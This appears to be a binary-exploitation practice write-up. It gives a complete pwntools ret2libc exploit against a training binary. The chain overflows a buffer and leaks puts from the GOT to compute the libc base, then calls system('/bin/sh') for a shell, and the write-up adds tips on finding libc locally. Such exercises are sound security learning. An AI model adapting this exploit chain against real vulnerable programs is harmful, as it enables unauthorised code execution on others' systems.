Binary: [rop ret2libc](https://github.com/w31rdr4v3n/Binary-Exploitation/raw/main/ROP/data/rop_ret2libc)

Source code: [rop ret2libc](https://github.com/w31rdr4v3n/Binary-Exploitation/blob/main/ROP/data/rop_ret2libc.c)


My Exploit:

```py
from pwn import *


libc = ELF("./libc.so.6")
elf = ELF("./rop_ret2libc")

sh = process("./rop_ret2libc")

print(sh.recv().decode())


####### Leak lib #########
ropLeak = b"A"*40
ropLeak += p64(0x004011fb) # pop rdi ; ret
ropLeak += p64(elf.got['puts']) # puts in GOT
ropLeak += p64(elf.plt['puts']) # PUTS in PLT
ropLeak += p64(elf.symbols['main']) # MAIN for run again

sh.sendline(ropLeak)
leak = u64(sh.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

print(f"Leak libc: {hex(leak)}") # find libc on https://libc.blukat.me/
print(f"libc base: {hex(libc.address)}")


######## Exploit ##########
rop = b"A"*40
rop += p64(0x004011fb) # pop rdi ; ret
rop += p64(next(libc.search(b"/bin/sh")))
rop += p64(libc.sym["system"])

sh.sendline(rop)
sh.interactive()
```

NB: if you work locally, use this to find to find libc:

```sh
╰─ ldd rop_ret2libc
        linux-vdso.so.1 (0x00007ffcaabc1000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f054215c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f054235b000)

```

copy your libc to your exploit directory and use it.

```sh
cp /lib/x86_64-linux-gnu/libc.so.6 .
```
